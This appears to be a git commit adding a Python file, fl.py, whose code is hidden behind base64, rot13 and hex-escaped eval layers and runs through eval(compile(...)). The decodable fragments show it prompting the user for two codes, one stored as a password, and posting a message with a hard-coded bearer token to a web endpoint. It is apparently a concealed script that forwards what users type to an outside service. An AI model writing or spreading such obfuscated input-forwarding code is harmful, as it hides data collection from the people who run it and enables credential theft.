e241ff7cc2d72e59b84ae3a37af2e6c23d9bd898
IBteesam <83177878+ibteesam@users.noreply.github.com>
2022-03-19 11:59:13 +0700

    Create fl.py

---
+++ fl.py
@@ -0,0 +1,11 @@
+# Python code obfuscated by www.development-tools.net 
+ 
+
+import base64, codecs
+magic = 'IyEvdXNyL2xvY2FsL2Jpbi9weXRob24zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQptc2cgPSBpbnB1dCgn4Lij4Lir4Lix4Liq4Lia4LiZIDogJykKcGFzc3dvcmQgPSBpbnB1dCgn4Lij4Lir4Lix4Liq4Lil4LmI4Liy4LiHIDogJykKbWVzc2FnZSA9K'
+love = 'TLaqKAypz5uoJHtBvO7oKAasFOpovOjLKAmq29lMPN6VUgjLKAmq29lMU0aXDc1pzjtCFNanUE0pUZ6Yl9ho3EcMaxgLKOcYzkcozHhoJHiLKOcY25iqTyzrFpXqT9eMJ4tCFNaoSSWIUy2MR56HQIFF0AvIGAHFzDjASL2BSOEoSA5GGAxAGOIq0EdFSEJGPpXnT'
+god = 'VhZGVycyA9IHsnY29udGVudC10eXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywnQXV0aG9yaXphdGlvbic6J0JlYXJlciAnK3Rva2VufQoKCnIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhID0geydtZXN'
+destiny = 'mLJqyWmcgMKAmLJqysFxXPaqbnJkyVSElqJH6Pty0nJ1yYaAfMJIjXQZcPtyjpzyhqPta4YzR4Yvu4YzV4YzN4YvV4Yvg4Yvp4Yv54YzW4YzQ4YvX4YzW4YvK4Yv14YzV4YvV4Yvj4Yvo4Yvk4YzW4Yvu4Yvp4Yv54YzW4YvI4Yv04YvH4YvI4Yvl4YvuVPRtWlx='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
